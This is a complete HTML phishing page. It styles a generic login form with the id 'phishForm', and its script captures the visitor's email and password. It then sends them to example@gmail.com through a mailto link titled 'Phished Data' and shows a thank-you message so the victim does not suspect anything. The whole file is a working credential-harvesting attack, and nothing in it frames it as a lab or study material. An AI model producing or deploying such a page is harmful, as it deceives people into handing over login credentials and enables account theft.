<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Login</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    background: #f4f6f8;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background: white;
    padding: 2rem;
    border-radius: 8px;
    width: 320px;
    box-shadow: 0 8px 16px rgba(0,0,0,0.1);
  }
  h2 {
    text-align: center;
    margin-bottom: 1.5rem;
    color: #333;
  }
  label {
    font-weight: 600;
    display: block;
    margin-bottom: 0.5rem;
    color: #444;
  }
  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 0.5rem;
    margin-bottom: 1rem;
    border: 1px solid #ccd0d5;
    border-radius: 4px;
    box-sizing: border-box;
  }
  button {
    background-color: #2e89ff;
    color: white;
    border: none;
    padding: 0.75rem;
    width: 100%;
    font-size: 1rem;
    border-radius: 4px;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #1b5ec9;
  }
  .alert {
    margin-top: 1rem;
    text-align: center;
    color: #d8000c;
    font-weight: 600;
  }
</style>
</head>
<body>
  <div class="container">
    <h2>Login</h2>
    <form id="phishForm">
      <label for="email">Email</label>
      <input type="text" id="email" name="email" required autocomplete="username" />
      <label for="password">Password</label>
      <input type="password" id="password" name="password" required autocomplete="current-password" />
      <button type="submit">Submit</button>
    </form>
    <div class="alert" id="alertMsg"></div>
  </div>
<script>
  // Sending collected data via mailto link and showing alert for user experience
  document.getElementById('phishForm').addEventListener('submit', function(event) {
    event.preventDefault();
    var email = encodeURIComponent(document.getElementById('email').value);
    var password = encodeURIComponent(document.getElementById('password').value);
    var subject = encodeURIComponent("Phished Data");
    var body = encodeURIComponent("Email: " + email + "\nPassword: " + password);

    // open mailto link
    window.location.href = "mailto:example@gmail.com?subject=" + subject + "&body=" + body;

    var alertMsg = document.getElementById('alertMsg');
    alertMsg.textContent = "Thank you for submitting your details.";

    // Clear form inputs
    this.reset();
  });
</script>
</body>
</html>
